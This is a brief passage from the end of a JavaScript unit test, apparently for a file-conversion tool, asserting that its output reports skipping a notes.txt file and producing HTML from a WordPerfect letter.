    expect(r.output).toContain('skip in/notes.txt');
    expect(r.output).toContain('html of in/Letter.WPD');
  });
});
